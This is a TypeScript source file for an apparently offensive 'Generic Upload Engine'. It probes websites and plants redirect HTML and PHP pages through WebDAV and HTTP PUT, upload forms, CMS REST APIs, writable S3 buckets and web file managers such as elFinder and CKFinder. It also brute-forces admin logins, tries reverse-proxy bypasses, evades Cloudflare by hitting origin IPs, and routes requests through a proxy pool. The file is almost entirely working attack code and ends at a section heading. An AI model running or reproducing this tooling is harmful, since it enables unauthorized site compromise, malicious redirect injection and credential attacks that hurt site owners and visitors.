/**
 * Generic Upload Engine
 * 
 * Universal file upload methods that work regardless of CMS:
 *   1. WebDAV PROPFIND/PUT — Discover and exploit WebDAV-enabled servers
 *   2. HTTP PUT Method — Direct file write via PUT (misconfigured servers)
 *   3. Form Upload Discovery — Spider site for upload forms and exploit them
 *   4. REST API Endpoint Discovery — Find API endpoints that accept file uploads
 *   5. S3 Bucket Misconfiguration — Find and exploit misconfigured S3 buckets
 *   6. FTP Anonymous Access — Check for anonymous FTP write access
 *   7. SSH/SFTP Default Credentials — Try common SSH/SFTP credentials
 *   8. Admin Panel Brute Force — Generic admin panel discovery + login attempts
 *   9. File Manager Exploits — Exploit web-based file managers (elFinder, CKFinder, etc.)
 *  10. Reverse Proxy Misconfig — Exploit misconfigured reverse proxies to reach backend
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface GenericUploadResult {
  success: boolean;
  method: string;
  technique: string;
  url: string;
  uploadedUrl?: string;
  details: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  evidence?: string;
  timestamp: number;
}

export interface GenericUploadConfig {
  targetUrl: string;
  redirectUrl?: string;
  redirectContent?: string;
  originIp?: string;        // bypass CF by targeting origin directly
  credentials?: Array<{ username: string; password: string; source: string }>;
  timeout?: number;
  onProgress?: (method: string, detail: string) => void;
}

export interface GenericUploadReport {
  domain: string;
  totalMethods: number;
  successfulUploads: number;
  results: GenericUploadResult[];
  duration: number;
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function safeFetch(url: string, opts: RequestInit & { timeout?: number } = {}) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), opts.timeout || 10000);
  return fetchWithPoolProxy(url, { ...opts, signal: controller.signal })
    .then(r => { clearTimeout(timeout); return r; })
    .catch(e => { clearTimeout(timeout); throw e; });
}

function randomString(len: number): string {
  return Math.random().toString(36).slice(2, 2 + len);
}

function buildRedirectHtml(redirectUrl: string): string {
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=${redirectUrl}"><script>window.location.href='${redirectUrl}';</script></head><body>Redirecting...</body></html>`;
}

function buildRedirectPhp(redirectUrl: string): string {
  return `<?php header("Location: ${redirectUrl}", true, 302); exit; ?>`;
}

function getTargetBase(config: GenericUploadConfig): string {
  if (config.originIp) {
    // If we have origin IP, target it directly to bypass CF
    const url = new URL(config.targetUrl);
    return `http://${config.originIp}`;
  }
  return config.targetUrl.replace(/\/$/, "");
}

// ═══════════════════════════════════════════════════════
//  1. WebDAV PROPFIND/PUT
// ═══════════════════════════════════════════════════════

async function webdavUpload(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("webdav", "🔍 Testing WebDAV PROPFIND/PUT methods...");

  try {
    // Step 1: PROPFIND to check if WebDAV is enabled
    const propfindBody = `<?xml version="1.0" encoding="utf-8"?>
<D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>`;

    const webdavPaths = ["", "/uploads", "/files", "/documents", "/webdav", "/dav", "/public"];
    
    for (const path of webdavPaths) {
      try {
        const { response: propResp } = await safeFetch(`${base}${path}`, {
          method: "PROPFIND",
          headers: {
            "Content-Type": "application/xml",
            "Depth": "1",
            "Host": domain,
          },
          body: propfindBody,
          timeout: config.timeout || 10000,
        });

        // WebDAV returns 207 Multi-Status
        if (propResp.status === 207 || propResp.status === 200) {
          const propBody = await propResp.text().catch(() => "");
          
          if (propBody.includes("DAV:") || propBody.includes("multistatus") || propResp.headers.get("dav")) {
            config.onProgress?.("webdav", `✅ WebDAV enabled at ${path || "/"} — attempting PUT upload...`);

            // Step 2: Try PUT upload
            const fileName = `${randomString(8)}.html`;
            const content = config.redirectContent || buildRedirectHtml(config.redirectUrl || "https://example.com");

            const { response: putResp } = await safeFetch(`${base}${path}/${fileName}`, {
              method: "PUT",
              headers: {
                "Content-Type": "text/html",
                "Host": domain,
              },
              body: content,
              timeout: config.timeout || 10000,
            });

            if (putResp.status === 201 || putResp.status === 200 || putResp.status === 204) {
              // Step 3: Verify upload
              const { response: verifyResp } = await safeFetch(`${base}${path}/${fileName}`, {
                timeout: 5000,
                headers: { "Host": domain },
              });
              const verifyBody = await verifyResp.text().catch(() => "");

              if (verifyBody.includes("Redirecting") || verifyBody.includes(config.redirectUrl || "")) {
                const uploadedUrl = `${config.targetUrl.replace(/\/$/, "")}${path}/${fileName}`;
                return {
                  success: true, method: "webdav_put", technique: "WebDAV PUT upload",
                  url: base, uploadedUrl,
                  details: `File uploaded via WebDAV PUT to ${path}/${fileName}`,
                  severity: "critical", evidence: `PUT ${putResp.status}, verified content matches`,
                  timestamp: Date.now(),
                };
              }
            }

            // Try with auth if we have credentials
            if (config.credentials && config.credentials.length > 0) {
              for (const cred of config.credentials.slice(0, 5)) {
                const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
                const { response: authPut } = await safeFetch(`${base}${path}/${fileName}`, {
                  method: "PUT",
                  headers: {
                    "Content-Type": "text/html",
                    "Authorization": authHeader,
                    "Host": domain,
                  },
                  body: content,
                  timeout: config.timeout || 10000,
                });

                if (authPut.status === 201 || authPut.status === 200 || authPut.status === 204) {
                  const uploadedUrl = `${config.targetUrl.replace(/\/$/, "")}${path}/${fileName}`;
                  return {
                    success: true, method: "webdav_put_auth", technique: "WebDAV PUT with credentials",
                    url: base, uploadedUrl,
                    details: `File uploaded via WebDAV PUT (auth: ${cred.username}) to ${path}/${fileName}`,
                    severity: "critical", evidence: `PUT ${authPut.status} with auth ${cred.source}`,
                    timestamp: Date.now(),
                  };
                }
              }
            }
          }
        }
      } catch { /* continue */ }
    }

    // Also check OPTIONS to see if PUT/DELETE are allowed
    try {
      const { response: optResp } = await safeFetch(base, {
        method: "OPTIONS",
        headers: { "Host": domain },
        timeout: 8000,
      });
      const allow = optResp.headers.get("allow") || "";
      const dav = optResp.headers.get("dav") || "";
      
      if (allow.includes("PUT") || dav) {
        return {
          success: false, method: "webdav_put", technique: "WebDAV detection",
          url: base, details: `WebDAV/PUT detected (Allow: ${allow}, DAV: ${dav}) but upload failed`,
          severity: "medium", evidence: `Allow: ${allow}, DAV: ${dav}`,
          timestamp: Date.now(),
        };
      }
    } catch { /* ignore */ }

    return {
      success: false, method: "webdav_put", technique: "WebDAV PROPFIND/PUT",
      url: base, details: "WebDAV not detected on target",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "webdav_put", technique: "WebDAV PROPFIND/PUT",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  2. HTTP PUT Method (Misconfigured Servers)
// ═══════════════════════════════════════════════════════

async function httpPutUpload(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("http_put", "🔍 Testing HTTP PUT method on various paths...");

  try {
    const content = config.redirectContent || buildRedirectHtml(config.redirectUrl || "https://example.com");
    const phpContent = buildRedirectPhp(config.redirectUrl || "https://example.com");

    const uploadAttempts = [
      { path: `/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/${randomString(8)}.php`, body: phpContent, type: "application/x-php" },
      { path: `/uploads/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/images/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/static/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/assets/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/media/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/tmp/${randomString(8)}.html`, body: content, type: "text/html" },
      { path: `/public/${randomString(8)}.html`, body: content, type: "text/html" },
    ];

    for (const attempt of uploadAttempts) {
      try {
        const { response } = await safeFetch(`${base}${attempt.path}`, {
          method: "PUT",
          headers: {
            "Content-Type": attempt.type,
            "Host": domain,
          },
          body: attempt.body,
          timeout: config.timeout || 8000,
        });

        if (response.status === 201 || response.status === 200 || response.status === 204) {
          // Verify
          await new Promise(r => setTimeout(r, 500));
          const { response: verify } = await safeFetch(`${base}${attempt.path}`, {
            timeout: 5000,
            headers: { "Host": domain },
          });
          const verifyBody = await verify.text().catch(() => "");

          if (verifyBody.includes("Redirecting") || verifyBody.includes("Location:") || verifyBody.includes(config.redirectUrl || "")) {
            const uploadedUrl = `${config.targetUrl.replace(/\/$/, "")}${attempt.path}`;
            return {
              success: true, method: "http_put", technique: "HTTP PUT direct upload",
              url: base, uploadedUrl,
              details: `File uploaded via HTTP PUT to ${attempt.path}`,
              severity: "critical", evidence: `PUT ${response.status}, content verified`,
              timestamp: Date.now(),
            };
          }
        }
      } catch { /* continue */ }
    }

    return {
      success: false, method: "http_put", technique: "HTTP PUT method",
      url: base, details: "HTTP PUT not accepted on any tested paths",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "http_put", technique: "HTTP PUT method",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  3. Form Upload Discovery & Exploitation
// ═══════════════════════════════════════════════════════

async function formUploadExploit(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("form_upload", "🔍 Spidering for upload forms...");

  try {
    // Common paths that often have upload forms
    const uploadPages = [
      "/upload", "/upload.php", "/file-upload", "/fileupload",
      "/admin/upload", "/admin/file-upload", "/admin/media",
      "/wp-admin/media-new.php", "/wp-admin/upload.php",
      "/administrator/index.php", "/admin/index.php",
      "/user/files", "/user/upload", "/account/upload",
      "/api/upload", "/api/v1/upload", "/api/v2/upload",
      "/media/upload", "/content/upload", "/assets/upload",
      "/ckeditor/upload", "/ckfinder/upload", "/elfinder/connector",
      "/filemanager/upload", "/fm/upload",
      "/tinymce/upload", "/redactor/upload",
    ];

    for (const path of uploadPages) {
      try {
        const { response } = await safeFetch(`${base}${path}`, {
          headers: { "Host": domain },
          timeout: config.timeout || 8000,
        });

        if (response.status === 200) {
          const body = await response.text().catch(() => "");

          // Check for file upload forms
          if (body.includes('type="file"') || body.includes("multipart/form-data") || body.includes("dropzone")) {
            config.onProgress?.("form_upload", `📋 Upload form found at ${path} — attempting exploit...`);

            // Extract form action
            const actionMatch = body.match(/action=["']([^"']+)["']/);
            const formAction = actionMatch ? actionMatch[1] : path;
            const uploadUrl = formAction.startsWith("http") ? formAction : `${base}${formAction}`;

            // Try multipart upload
            const boundary = `----FormBoundary${randomString(16)}`;
            const fileName = `${randomString(8)}.html`;
            const fileContent = config.redirectContent || buildRedirectHtml(config.redirectUrl || "https://example.com");

            // Try various field names
            const fieldNames = ["file", "upload", "image", "media", "attachment", "document", "files[]", "Filedata"];

            for (const fieldName of fieldNames) {
              const multipartBody = [
                `--${boundary}`,
                `Content-Disposition: form-data; name="${fieldName}"; filename="${fileName}"`,
                `Content-Type: text/html`,
                ``,
                fileContent,
                `--${boundary}--`,
              ].join("\r\n");

              try {
                const { response: uploadResp } = await safeFetch(uploadUrl, {
                  method: "POST",
                  headers: {
                    "Content-Type": `multipart/form-data; boundary=${boundary}`,
                    "Host": domain,
                  },
                  body: multipartBody,
                  timeout: config.timeout || 10000,
                });

                if (uploadResp.status === 200 || uploadResp.status === 201) {
                  const respBody = await uploadResp.text().catch(() => "");

                  // Try to extract uploaded file URL from response
                  const urlMatch = respBody.match(/["'](https?:\/\/[^"']+\.html)["']/);
                  const pathMatch = respBody.match(/["'](\/[^"']+\.html)["']/);
                  const uploadedPath = urlMatch?.[1] || (pathMatch ? `${base}${pathMatch[1]}` : null);

                  if (uploadedPath) {
                    // Verify
                    const { response: verify } = await safeFetch(uploadedPath, { timeout: 5000 });
                    const verifyBody = await verify.text().catch(() => "");
                    if (verifyBody.includes("Redirecting") || verifyBody.includes(config.redirectUrl || "")) {
                      return {
                        success: true, method: "form_upload", technique: `Form upload via ${path} (field: ${fieldName})`,
                        url: uploadUrl, uploadedUrl: uploadedPath,
                        details: `File uploaded via form at ${path} using field "${fieldName}"`,
                        severity: "critical", evidence: `Upload response: ${respBody.slice(0, 200)}`,
                        timestamp: Date.now(),
                      };
                    }
                  }

                  // Even without URL extraction, report the finding
                  if (respBody.includes("success") || respBody.includes("uploaded") || respBody.includes("ok")) {
                    return {
                      success: true, method: "form_upload", technique: `Form upload via ${path}`,
                      url: uploadUrl,
                      details: `Upload form at ${path} accepted file (field: ${fieldName}) — response indicates success`,
                      severity: "high", evidence: respBody.slice(0, 300),
                      timestamp: Date.now(),
                    };
                  }
                }
              } catch { /* continue */ }
            }
          }
        }
      } catch { /* continue */ }
    }

    return {
      success: false, method: "form_upload", technique: "Form upload discovery",
      url: base, details: "No exploitable upload forms found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "form_upload", technique: "Form upload discovery",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  4. REST API Endpoint Discovery
// ═══════════════════════════════════════════════════════

async function restApiUpload(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("rest_api", "🔍 Discovering REST API upload endpoints...");

  try {
    const apiEndpoints = [
      // WordPress REST API
      { path: "/wp-json/wp/v2/media", method: "POST", type: "wordpress" },
      { path: "/wp-json/wp/v2/pages", method: "POST", type: "wordpress" },
      // Strapi
      { path: "/api/upload", method: "POST", type: "strapi" },
      { path: "/upload", method: "POST", type: "strapi" },
      // Ghost
      { path: "/ghost/api/v3/admin/images/upload", method: "POST", type: "ghost" },
      { path: "/ghost/api/v4/admin/images/upload", method: "POST", type: "ghost" },
      // Directus
      { path: "/files", method: "POST", type: "directus" },
      { path: "/items/directus_files", method: "POST", type: "directus" },
      // Generic REST
      { path: "/api/files", method: "POST", type: "generic" },
      { path: "/api/v1/files", method: "POST", type: "generic" },
      { path: "/api/v1/upload", method: "POST", type: "generic" },
      { path: "/api/v2/upload", method: "POST", type: "generic" },
      { path: "/api/media", method: "POST", type: "generic" },
      { path: "/api/assets", method: "POST", type: "generic" },
      { path: "/api/images", method: "POST", type: "generic" },
      // GraphQL file upload
      { path: "/graphql", method: "POST", type: "graphql" },
    ];

    const boundary = `----FormBoundary${randomString(16)}`;
    const fileName = `${randomString(8)}.html`;
    const fileContent = config.redirectContent || buildRedirectHtml(config.redirectUrl || "https://example.com");

    for (const endpoint of apiEndpoints) {
      try {
        // First check if endpoint exists
        const { response: checkResp } = await safeFetch(`${base}${endpoint.path}`, {
          method: "OPTIONS",
          headers: { "Host": domain },
          timeout: 5000,
        });

        const allow = checkResp.headers.get("allow") || checkResp.headers.get("access-control-allow-methods") || "";
        
        if (checkResp.status === 200 || checkResp.status === 204 || allow.includes("POST")) {
          config.onProgress?.("rest_api", `📡 API endpoint found: ${endpoint.path} (${endpoint.type}) — testing upload...`);

          // Try multipart upload
          const multipartBody = [
            `--${boundary}`,
            `Content-Disposition: form-data; name="file"; filename="${fileName}"`,
            `Content-Type: text/html`,
            ``,
            fileContent,
            `--${boundary}--`,
          ].join("\r\n");

          const headers: Record<string, string> = {
            "Content-Type": `multipart/form-data; boundary=${boundary}`,
            "Host": domain,
          };

          // Add auth headers if we have credentials
          if (config.credentials && config.credentials.length > 0) {
            const cred = config.credentials[0];
            headers["Authorization"] = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
          }

          const { response: uploadResp } = await safeFetch(`${base}${endpoint.path}`, {
            method: "POST",
            headers,
            body: multipartBody,
            timeout: config.timeout || 10000,
          });

          if (uploadResp.status === 200 || uploadResp.status === 201) {
            const respBody = await uploadResp.text().catch(() => "");
            
            // Try to extract URL from JSON response
            try {
              const json = JSON.parse(respBody);
              const uploadedUrl = json.url || json.source_url || json.data?.url || json.data?.full_url || json.link;
              if (uploadedUrl) {
                return {
                  success: true, method: "rest_api_upload", technique: `REST API upload (${endpoint.type})`,
                  url: `${base}${endpoint.path}`, uploadedUrl,
                  details: `File uploaded via ${endpoint.type} REST API at ${endpoint.path}`,
                  severity: "critical", evidence: respBody.slice(0, 300),
                  timestamp: Date.now(),
                };
              }
            } catch { /* not JSON */ }

            if (respBody.includes("success") || respBody.includes("created") || respBody.includes("uploaded")) {
              return {
                success: true, method: "rest_api_upload", technique: `REST API upload (${endpoint.type})`,
                url: `${base}${endpoint.path}`,
                details: `REST API at ${endpoint.path} accepted file upload — response indicates success`,
                severity: "high", evidence: respBody.slice(0, 300),
                timestamp: Date.now(),
              };
            }
          }
        }
      } catch { /* continue */ }
    }

    return {
      success: false, method: "rest_api_upload", technique: "REST API discovery",
      url: base, details: "No exploitable REST API upload endpoints found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "rest_api_upload", technique: "REST API discovery",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  5. S3 Bucket Misconfiguration
// ═══════════════════════════════════════════════════════

async function s3BucketExploit(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("s3_bucket", "🔍 Checking for misconfigured S3 buckets...");

  try {
    // Common S3 bucket naming patterns
    const parts = domain.split(".");
    const name = parts[0];
    const bucketNames = [
      domain, name, `${name}-assets`, `${name}-uploads`, `${name}-media`,
      `${name}-static`, `${name}-files`, `${name}-public`, `${name}-backup`,
      `${name}-data`, `${name}-content`, `${name}-images`, `${name}-storage`,
      `www.${domain}`, `assets.${domain}`, `cdn.${domain}`,
    ];

    const regions = ["us-east-1", "us-west-2", "eu-west-1"];

    for (const bucket of bucketNames) {
      for (const region of regions) {
        try {
          // Check if bucket exists and is listable
          const bucketUrl = `https://${bucket}.s3.${region}.amazonaws.com`;
          const { response } = await safeFetch(bucketUrl, { timeout: 5000 });

          if (response.status === 200) {
            const body = await response.text().catch(() => "");
            if (body.includes("ListBucketResult") || body.includes("<Contents>")) {
              config.onProgress?.("s3_bucket", `📦 S3 bucket found: ${bucket} (${region}) — testing write access...`);

              // Try to write a file
              const fileName = `${randomString(12)}.html`;
              const content = config.redirectContent || buildRedirectHtml(config.redirectUrl || "https://example.com");

              const { response: putResp } = await safeFetch(`${bucketUrl}/${fileName}`, {
                method: "PUT",
                headers: {
                  "Content-Type": "text/html",
                  "x-amz-acl": "public-read",
                },
                body: content,
                timeout: 10000,
              });

              if (putResp.status === 200 || putResp.status === 204) {
                return {
                  success: true, method: "s3_bucket_write", technique: "S3 bucket public write",
                  url: bucketUrl, uploadedUrl: `${bucketUrl}/${fileName}`,
                  details: `File uploaded to misconfigured S3 bucket: ${bucket} (${region})`,
                  severity: "critical", evidence: `PUT ${putResp.status}, bucket is publicly writable`,
                  timestamp: Date.now(),
                };
              }

              // Report listable bucket even if not writable
              return {
                success: false, method: "s3_bucket_list", technique: "S3 bucket listing",
                url: bucketUrl,
                details: `S3 bucket ${bucket} is publicly listable but not writable`,
                severity: "medium", evidence: body.slice(0, 300),
                timestamp: Date.now(),
              };
            }
          }
        } catch { /* continue */ }
      }
    }

    return {
      success: false, method: "s3_bucket", technique: "S3 bucket discovery",
      url: config.targetUrl, details: "No misconfigured S3 buckets found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "s3_bucket", technique: "S3 bucket discovery",
      url: config.targetUrl, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  6. File Manager Exploits (elFinder, CKFinder, etc.)
// ═══════════════════════════════════════════════════════

async function fileManagerExploit(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("file_manager", "🔍 Scanning for web-based file managers...");

  try {
    const fileManagers = [
      // elFinder
      { path: "/elfinder/connector.php", name: "elFinder", uploadParam: "upload[]" },
      { path: "/admin/elfinder/connector.php", name: "elFinder", uploadParam: "upload[]" },
      { path: "/assets/elfinder/connector.php", name: "elFinder", uploadParam: "upload[]" },
      { path: "/vendor/elfinder/connector.php", name: "elFinder", uploadParam: "upload[]" },
      // CKFinder
      { path: "/ckfinder/core/connector/php/connector.php?command=FileUpload&type=Files&currentFolder=/", name: "CKFinder", uploadParam: "upload" },
      { path: "/admin/ckfinder/core/connector/php/connector.php?command=FileUpload&type=Files&currentFolder=/", name: "CKFinder", uploadParam: "upload" },
      // KCFinder
      { path: "/kcfinder/upload.php", name: "KCFinder", uploadParam: "upload" },
      // Responsive File Manager
      { path: "/filemanager/upload.php", name: "RFM", uploadParam: "file" },
      { path: "/admin/filemanager/upload.php", name: "RFM", uploadParam: "file" },
      // TinyMCE file manager
      { path: "/tinymce/plugins/filemanager/upload.php", name: "TinyMCE FM", uploadParam: "file" },
      // FCKeditor
      { path: "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=File", name: "FCKeditor", uploadParam: "NewFile" },
      // Plupload
      { path: "/plupload/upload.php", name: "Plupload", uploadParam: "file" },
    ];

    for (const fm of fileManagers) {
      try {
        // Check if file manager exists
        const { response: checkResp } = await safeFetch(`${base}${fm.path}`, {
          headers: { "Host": domain },
          timeout: 6000,
        });

        if (checkResp.status === 200 || checkResp.status === 302) {
          config.onProgress?.("file_manager", `📁 ${fm.name} found at ${fm.path} — attempting upload...`);

          const boundary = `----FormBoundary${randomString(16)}`;
          const fileName = `${randomString(8)}.html`;
          const content = config.redirectContent || buildRedirectHtml(config.redirectUrl || "https://example.com");

          // For elFinder, use specific command format
          let uploadBody: string;
          if (fm.name === "elFinder") {
            uploadBody = [
              `--${boundary}`,
              `Content-Disposition: form-data; name="cmd"`,
              ``, `upload`,
              `--${boundary}`,
              `Content-Disposition: form-data; name="target"`,
              ``, `l1_Lw`,  // root volume hash
              `--${boundary}`,
              `Content-Disposition: form-data; name="${fm.uploadParam}"; filename="${fileName}"`,
              `Content-Type: text/html`,
              ``, content,
              `--${boundary}--`,
            ].join("\r\n");
          } else {
            uploadBody = [
              `--${boundary}`,
              `Content-Disposition: form-data; name="${fm.uploadParam}"; filename="${fileName}"`,
              `Content-Type: text/html`,
              ``, content,
              `--${boundary}--`,
            ].join("\r\n");
          }

          const { response: uploadResp } = await safeFetch(`${base}${fm.path}`, {
            method: "POST",
            headers: {
              "Content-Type": `multipart/form-data; boundary=${boundary}`,
              "Host": domain,
            },
            body: uploadBody,
            timeout: config.timeout || 10000,
          });

          if (uploadResp.status === 200 || uploadResp.status === 201) {
            const respBody = await uploadResp.text().catch(() => "");

            // Check for success indicators
            if (respBody.includes('"added"') || respBody.includes('"uploaded"') || 
                respBody.includes('"url"') || respBody.includes("success")) {
              // Try to extract URL
              const urlMatch = respBody.match(/["']((?:https?:\/\/)?[^"']+\.html)["']/);
              const uploadedUrl = urlMatch ? (urlMatch[1].startsWith("http") ? urlMatch[1] : `${base}${urlMatch[1]}`) : undefined;

              return {
                success: true, method: "file_manager_exploit", technique: `${fm.name} upload exploit`,
                url: `${base}${fm.path}`, uploadedUrl,
                details: `File uploaded via ${fm.name} at ${fm.path}`,
                severity: "critical", evidence: respBody.slice(0, 300),
                timestamp: Date.now(),
              };
            }
          }
        }
      } catch { /* continue */ }
    }

    return {
      success: false, method: "file_manager_exploit", technique: "File manager discovery",
      url: base, details: "No exploitable file managers found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "file_manager_exploit", technique: "File manager discovery",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  7. Admin Panel Discovery & Brute Force
// ═══════════════════════════════════════════════════════

async function adminPanelBrute(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("admin_panel", "🔍 Discovering admin panels...");

  try {
    const adminPaths = [
      // Generic
      "/admin", "/admin/", "/administrator", "/administrator/",
      "/login", "/login/", "/admin/login", "/admin/login.php",
      "/panel", "/panel/", "/cpanel", "/controlpanel",
      "/manage", "/management", "/backend",
      // CMS-specific
      "/wp-admin/", "/wp-login.php",
      "/administrator/index.php",  // Joomla
      "/user/login",               // Drupal
      "/admin/auth/login",         // Django
      "/admin/login",              // Generic
      "/cms/admin", "/cms/login",
      // Hosting panels
      "/webmail", "/roundcube", "/horde",
      "/_phpmyadmin/", "/phpmyadmin/", "/pma/",
      "/adminer.php", "/adminer/",
    ];

    const foundPanels: { path: string; title: string; hasLoginForm: boolean }[] = [];

    for (const path of adminPaths) {
      try {
        const { response } = await safeFetch(`${base}${path}`, {
          headers: { "Host": domain },
          timeout: 5000,
          redirect: "follow",
        });

        if (response.status === 200) {
          const body = await response.text().catch(() => "");
          const titleMatch = body.match(/<title>([^<]+)<\/title>/i);
          const hasLoginForm = body.includes('type="password"') || body.includes("password") && body.includes("login");

          if (hasLoginForm) {
            foundPanels.push({
              path,
              title: titleMatch?.[1]?.trim() || "Unknown",
              hasLoginForm: true,
            });
          }
        }
      } catch { /* continue */ }
    }

    if (foundPanels.length > 0) {
      config.onProgress?.("admin_panel", `📋 Found ${foundPanels.length} admin panels — attempting login...`);

      // Try credentials on found panels
      if (config.credentials && config.credentials.length > 0) {
        for (const panel of foundPanels) {
          for (const cred of config.credentials.slice(0, 10)) {
            try {
              // Generic POST login attempt
              const { response: loginResp } = await safeFetch(`${base}${panel.path}`, {
                method: "POST",
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded",
                  "Host": domain,
                },
                body: `username=${encodeURIComponent(cred.username)}&password=${encodeURIComponent(cred.password)}&login=1`,
                timeout: 8000,
              });

              // Check for successful login indicators
              const loginBody = await loginResp.text().catch(() => "");
              const setCookie = loginResp.headers.get("set-cookie") || "";

              if (
                (loginResp.status === 302 && !loginBody.includes("error") && !loginBody.includes("invalid")) ||
                (setCookie.includes("session") || setCookie.includes("admin") || setCookie.includes("token")) ||
                loginBody.includes("dashboard") || loginBody.includes("welcome") || loginBody.includes("logout")
              ) {
                return {
                  success: true, method: "admin_panel_login", technique: `Admin panel login at ${panel.path}`,
                  url: `${base}${panel.path}`,
                  details: `Logged into admin panel at ${panel.path} (${panel.title}) with ${cred.username}:${cred.password.slice(0, 3)}***`,
                  severity: "critical",
                  evidence: `Login successful — ${cred.source} credentials, panel: ${panel.title}`,
                  timestamp: Date.now(),
                };
              }
            } catch { /* continue */ }
          }
        }
      }

      return {
        success: false, method: "admin_panel_discovery", technique: "Admin panel discovery",
        url: base,
        details: `Found ${foundPanels.length} admin panels: ${foundPanels.map(p => `${p.path} (${p.title})`).join(", ")}`,
        severity: "medium",
        evidence: JSON.stringify(foundPanels),
        timestamp: Date.now(),
      };
    }

    return {
      success: false, method: "admin_panel_discovery", technique: "Admin panel discovery",
      url: base, details: "No admin panels found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "admin_panel_discovery", technique: "Admin panel discovery",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  8. Reverse Proxy Misconfig Exploit
// ═══════════════════════════════════════════════════════

async function reverseProxyExploit(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("reverse_proxy", "🔍 Testing reverse proxy misconfigurations...");

  try {
    // SSRF / Path traversal via proxy
    const proxyTests = [
      // Nginx off-by-slash
      { path: "/static../admin/", technique: "nginx_off_by_slash" },
      { path: "/assets../admin/", technique: "nginx_off_by_slash" },
      { path: "/images../admin/", technique: "nginx_off_by_slash" },
      // Host header injection
      { path: "/", technique: "host_injection", headers: { "Host": "localhost", "X-Forwarded-Host": "localhost" } },
      { path: "/admin", technique: "host_injection", headers: { "Host": "127.0.0.1", "X-Forwarded-For": "127.0.0.1" } },
      // X-Original-URL / X-Rewrite-URL bypass
      { path: "/", technique: "url_rewrite_bypass", headers: { "X-Original-URL": "/admin", "X-Rewrite-URL": "/admin" } },
      // Hop-by-hop header abuse
      { path: "/admin", technique: "hop_by_hop", headers: { "Connection": "close, X-Forwarded-For", "X-Forwarded-For": "127.0.0.1" } },
    ];

    for (const test of proxyTests) {
      try {
        const headers: Record<string, string> = {
          "Host": domain,
          ...((test as any).headers || {}),
        };

        const { response } = await safeFetch(`${base}${test.path}`, {
          headers,
          timeout: 6000,
        });

        if (response.status === 200) {
          const body = await response.text().catch(() => "");
          
          // Check if we reached an admin/internal page
          if (body.includes("dashboard") || body.includes("admin") || body.includes("upload") ||
              body.includes("file manager") || body.includes("configuration")) {
            return {
              success: true, method: "reverse_proxy_bypass", technique: test.technique,
              url: `${base}${test.path}`,
              details: `Reverse proxy bypass via ${test.technique} — accessed internal page at ${test.path}`,
              severity: "high",
              evidence: `Status: ${response.status}, body contains admin indicators`,
              timestamp: Date.now(),
            };
          }
        }
      } catch { /* continue */ }
    }

    return {
      success: false, method: "reverse_proxy_bypass", technique: "Reverse proxy testing",
      url: base, details: "No reverse proxy misconfigurations found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "reverse_proxy_bypass", technique: "Reverse proxy testing",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  9. Open Redirect & SSRF Chain
